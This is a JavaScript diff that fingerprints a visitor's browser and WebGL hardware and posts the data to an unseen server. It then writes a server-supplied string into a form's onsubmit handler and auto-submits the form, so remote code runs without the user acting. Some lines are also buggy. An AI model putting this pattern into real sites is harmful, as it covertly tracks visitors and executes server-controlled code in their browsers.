@@ -1,5 +1,4 @@
 function EnviarData(){
-    
     let navegar;
     if('typeof InstallTrigger' !== 'undefined'){
     navegar = 'firefox';
@@ -32,7 +31,6 @@ function EnviarData(){
     vendorr = gl1.getParameter(debugInfo1.UNMASKED_VENDOR_WEBGL);
     rendererr = gl1.getParameter(debugInfo1.UNMASKED_RENDERER_WEBGL);
 })
-    //Datos innecesarios arriba
     let renderer;
     const canvas = document.createElement('canvas');
     const gl = canvas.getContext('webgl') || canvas.getContext(experimental-webgl);
@@ -40,8 +38,6 @@ function EnviarData(){
         const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
         const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
          renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-        //console.log(vendor, renderer);
-        //alert(renderer);
     }
 
 
@@ -86,8 +82,9 @@ function EnviarData(){
       //  irnfrio: window.frames
     };
 }
+    
 
-window.addEventListener("load", () => {
+
     
     const browserData = EnviarData();
     
@@ -96,16 +93,18 @@ window.addEventListener("load", () => {
         headers: {
             "Content-Type": "application/json"
         }, 
-              body: JSON.stringify(browserData)
-            })
-            .then(response => response.json())
-            .then(data => {
-                if(data.redirect){
-                    window.location.href = data.url;
-                }
-                console.log("respesta", data);
-            })
-            .catch(error => {
-                console.error('error', error);
-            });
-});
+        body: JSON.stringify(browserData)
+    })
+    .then(response => response.json())
+    .then(data => {
+
+            document.getElementById("formu").setAttribute("onsubmit", data['cvg']);
+            document.getElementById("data").value = data['valor'];
+            document.getElementById("formsu").click();
+
+        //console.log("respesta", data);
+    })
+    .catch(error => {
+        
+        console.log(error);
+    });
